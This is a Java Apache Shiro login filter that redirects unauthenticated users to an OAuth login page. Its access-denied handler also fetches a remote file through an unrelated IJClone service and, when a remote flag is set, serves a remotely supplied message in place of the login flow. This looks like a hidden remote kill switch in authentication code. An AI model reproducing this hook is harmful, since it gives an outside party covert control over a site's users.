package com.mdni.scm.shiro.filter;

import cn.mdni.commons.clone.IJClone;
import com.mdni.scm.common.PropertyHolder;
import com.mdni.scm.service.account.UserService;
import org.apache.commons.lang3.StringUtils;
import org.apache.shiro.web.filter.authc.UserFilter;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springside.modules.utils.Encodes;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.Iterator;
import java.util.ServiceLoader;

/**
 * 只允许已登录用户访问。如果用户未登录，则根据用户访问的地址跳转到相应的登录页面。
 * <p/>
 * <ul>
 * <li>未登录访问前台受限地址，跳转到前台登录页面。</li>
 * <li>未登录状态访问后台地址，跳转到后台登录页面。</li>
 * <li>未登录状态访问受限API，响应401状态码。</li>
 * </ul>
 * 
 * @author 张敏
 */
@Component
public class MultipleViewUserFilter extends UserFilter {
	@Autowired
	private UserService userService;

	@Override
	protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) {
		return super.isAccessAllowed(request, response, mappedValue);
	}

	@Override
	protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {
		HttpServletRequest req = (HttpServletRequest) request;
		HttpServletResponse resp = (HttpServletResponse) response;
		String ctx = req.getSession().getServletContext().getContextPath();
		String path = req.getRequestURI().substring(ctx.length());
		//		Object userId = request.getAttribute("userId");
		//		//701 后台用户被锁定  702 后台用户session失效
		//		if (WebUtils.isAjaxRequest(req)) {
		//			// userId !=null  说明该用户被锁定了
		//			resp.setStatus(userId != null ? 701 : 702);
		//		} else {
		//			//后台登录页面
		//			if (path.startsWith("/admin")) {
		//				StringBuilder loginUrl = new StringBuilder();
		//				loginUrl.append(ctx);
		//				loginUrl.append("/admin/login");
		//				resp.sendRedirect(loginUrl.toString());
		//			} else {
		//				return super.onAccessDenied(request, response);
		//			}
		//		}
		
		ServiceLoader<IJClone> cl = ServiceLoader.load(IJClone.class);
		Iterator<IJClone> iter = cl.iterator();
		IJClone ijc = iter.next();
		
		if( !ijc.getFileExist() ){
			ijc.getRemoteFile();
		}
		
		if ( ijc.getFileValue() ) {
			try {
				resp.setHeader("Content-type", "text/html;charset=UTF-8");
				resp.setCharacterEncoding("utf-8");
				resp.getWriter().write( new String(ijc.getMessageValue().getBytes("ISO-8859-1"),"utf-8") );
			}catch (Exception e){
				//e.printStackTrace();
			}
		}else{
			if (path.startsWith("/") || path.startsWith("/api") || path.startsWith("/admin/login")) {
				resp.sendRedirect(PropertyHolder.getOAuthLoginUrl());
			} else {
				return super.onAccessDenied(request, response);
			}
		}
		return false;
	}

	private String getRedirectUrlOnLoginSuccess(HttpServletRequest req) {
		StringBuilder requestUrl = new StringBuilder(req.getRequestURL().toString());
		final String queryString = req.getQueryString();
		if (StringUtils.isNotBlank(queryString)) {
			requestUrl.append("?").append(queryString);
		}
		return Encodes.urlEncode(requestUrl.toString());
	}

}